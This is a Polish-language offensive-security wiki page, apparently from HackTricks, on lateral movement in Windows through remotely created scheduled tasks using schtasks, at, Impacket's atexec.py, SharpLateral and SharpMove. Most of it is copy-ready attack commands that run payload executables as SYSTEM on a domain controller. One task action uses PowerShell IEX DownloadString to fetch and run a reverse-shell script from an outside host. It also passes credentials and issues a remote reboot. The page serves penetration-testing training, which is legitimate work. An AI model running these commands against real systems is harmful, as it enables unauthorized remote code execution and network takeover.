# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Jak to działa

Mając uprawnienia administracyjne do hosta Windows, operator może zdalnie utworzyć i uruchomić zaplanowane zadanie. Opcja `/S` wybiera zdalny host, `/U` i `/P` podają poświadczenia wymagane do utworzenia zadania, a `/RU` wybiera konto, w kontekście którego zadanie zostanie uruchomione. Polecenie wskazane przez `/TR` musi istnieć w systemie zdalnym.<sup>[[1]](#references)</sup>

Starsze polecenie `at` również może zaplanować polecenie na zdalnym hoście, gdy działa usługa Schedule. Wykonuje ono zaplanowane zadania przy użyciu konta usługi, którym często jest `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Utwórz zadanie, a następnie je uruchom:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Na przykład:
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
W przypadku cyklicznego zadania tygodniowego użyj prawidłowego harmonogramu tygodniowego i wyraźnie określ dzień:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Akcja zadania może również bezpośrednio wywoływać PowerShell. Poniższy przykład laboratoryjny pobiera i uruchamia skrypt; hostuj payload wyłącznie na infrastrukturze autoryzowanej na potrzeby assessmentu:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
`atexec.py` z Impacket automatyzuje zdalne wykonywanie poleceń za pośrednictwem usługi Harmonogram zadań i obsługuje uwierzytelnianie za pomocą hasła, hasha NTLM lub Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral udostępnia metodę wykonywania zadań zaplanowanych:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove udostępnia kolejną implementację Task Scheduler:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Więcej informacji na temat [**użycia schtasks z silver tickets tutaj**](../active-directory-methodology/silver-ticket.md#host).

Usuń zadania testowe po użyciu:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - polecenie `at`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
